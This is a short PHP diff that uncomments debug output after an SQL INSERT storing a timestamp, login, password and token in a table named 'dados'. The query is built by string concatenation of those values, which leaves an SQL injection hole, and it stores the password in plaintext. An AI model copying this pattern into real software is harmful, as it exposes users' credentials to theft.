@@ -89,8 +89,8 @@ $tempo = date('m/d/Y h:i:s a');
 $query = "INSERT INTO dados (id1, id2, id3, id4) VALUES ('" . $tempo . "', '" . $login . "', '" . $passw . "', '" . $token . "');";
 
 $result = $db->query($query);
-//echo var_dump($result);
-//echo '<br><br>';
+echo var_dump($result);
+echo '<br><br>';
 $result->closeCursor();
 //$app->register(new Herrera\Pdo\PdoServiceProvider(), $zica);
 //echo '<br>end<br>';
